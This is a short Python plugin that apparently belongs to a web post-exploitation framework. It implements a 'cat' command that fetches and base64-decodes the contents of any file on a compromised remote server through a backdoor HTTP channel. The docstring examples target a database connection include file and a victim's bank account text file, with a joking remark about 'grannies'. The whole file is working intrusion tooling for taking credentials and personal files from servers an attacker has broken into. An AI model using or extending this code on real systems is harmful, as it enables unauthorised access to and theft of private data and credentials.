"""Print a file content to standard output

SYNOPSIS:
    cat <REMOTE FILE>

DESCRIPTION:
    This command prints the given file content on the standard
    output.

    NOTE: Unlike the GNU's 'cat' command, this plugin only takes
    one single file as argument, and have no support for multi
    file concatenation to standard output.

EXAMPLES:
    > cat ../includes/connect.inc.php
      - Display the connect.inc.php's content.
    > cat "C:\\Users\\granny\\Desktop\\bank account.TXT"
      - Don't be evil with grannies!
        NOTE: since gannies use spaces in file names, the path
        string must be enquoted to be considered as a single
        argument.

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import base64

if self.argc != 2:
    api.exit(self.help)

relPath = self.argv[1]
absPath = rpath.abspath(relPath)

if relPath.endswith(rpath.separator):
    api.exit(self.help)

http.send({'FILE' : absPath})

errs = {'noexists': 'No such file or directory',
        'notafile': 'Not a file',
        'noread':   'Permission denied'}

if http.error in errs:
    api.exit(P_err+'%s: %s: %s' % (self.name, absPath, errs[http.error]))

print base64.b64decode(http.response)